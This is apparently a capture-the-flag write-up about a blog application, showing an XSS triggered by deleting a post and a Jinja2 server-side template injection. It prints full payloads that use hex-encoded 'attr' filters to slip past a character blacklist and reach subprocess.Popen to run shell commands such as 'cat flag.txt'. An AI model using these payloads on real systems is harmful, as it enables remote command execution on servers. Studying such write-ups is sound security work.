# My First Blog
## XSS 
We can enter the 'Title' and 'Content' fields on the post creation page. When a post is created, it is directed to the home page, the title entered in red text at the top of the page is written in this red area and the area where the posts are listed.

When input is given to the title and content areas using `<script>alert(1)</script>`, it is seen that after being redirected to the home page, no Javascript code runs and the entered code remains as a string. After trying many XSS payloads, the first thing I entered was to delete the post with the title `<script>alert(1)</script>`. When I went to the edit tab and deleted the post and redirected it to the home page, it seems that the Javascript code is working. It can be seen that the red warning block at the top of the page where the post title should be written is blank. When you try to delete an ordinary post, you may see that the title of the post should be written in that section.

To summarize, the XSS vulnerability is triggered if we write code that will trigger XSS in the post title and delete the post. But where can we go with XSS? By using the XSS vulnerability, any Javascript code can be written into the 'script' block. If you send a GET request to `ifconfig.me` using the Fetch API, it appears that the sent request runs in the attacker's browser through the client, without going to the server side. So it doesn't seem like XSS will gain us anything.

## SSTI
XSS's little brother is SSTI. So, what happens if a block of code that will trigger SSTI is written in the post title instead of code that will trigger XSS? After all, don't they both enable code to run in HTML? If we write `{{7*7}}` in the post title and delete the post, you can see that forty-nine, which is the answer to seven times seven, is written in the red information block that appears after being directed to the home page. So he had done the math. Neither HTML nor XSS can do this. It's SSTI time.

It can be determined which temrating engine is used by trying the generic SSTI codes, Jinja2. Jinja2, that is, Python, is running on the server. `{{'abc'.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[ If we try 0].strip()}}` the page makes fun of us a little. It is said to be a wildcard-based blacklist that severely restricts the attacker. No problem, Jinja2 filters allow us to run the necessary commands without using these wildcards.

For example:
The `{{'abc'.__class__}}` command is blocked by wildcards.
but this code is created using `attr` and `__class__` string value converted to hex numbers `{{'abc'|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")}}` We don't care much about wildcards if they are used. For more information about the `attr` filter and the filters that will be used in the rest of the solution, [source](https://jinja.palletsprojects.com/en/3.1.x/templates/#list-of-builtin-filters).

 ## Blacklist Bypass
We passed the wildcards a little bit. So what value should we give for `__subclasses__`? The number we need to use in this attack is `{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")| attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\ x5f\x5f")()}}` will be obtained from the list by entering this code. The number found is `{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f")|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(YOUR_INDEX_NUMBER)}}` It will be used in the command. In short, we only reached the Python `subprocess.Popen` module. Now it's time to access using this module. Related [article](https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f).

`{{()|attr("\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f")|attr("\x5f\x5f\x62\x61\x73\x65\x5f\x5f" )|attr("\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f")()|attr("\x5f\x5f\x67\x65\ x74\x69\x74\x65\x6d\x5f\x5f")(YOUR_INDEX_NUMBER)('ls',shell=True,stdout=-1)|attr("communicate")()|attr("\x5f\x5f\x67\x65\x74\x69\x74\x65\x6d\x5f\x5f")(0)}}` `subprocess.Popen` has been called, the next thing to do when each function is called is to open the parentheses and give the arguments. `...redacted...(YOUR_INDEX_NUMBER)("ls",shell=True,stdout=-1)` will be the function content we will use. Next, all that remains is to convert the payload into something we can use as `attr` and hex number.


## Sources
- https://jinja.palletsprojects.com/en/3.1.x/templates/#list-of-builtin-filters
- https://medium.com/@nyomanpradipta120/jinja2-ssti-filter-bypasses-a8d3eb7b000f
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2

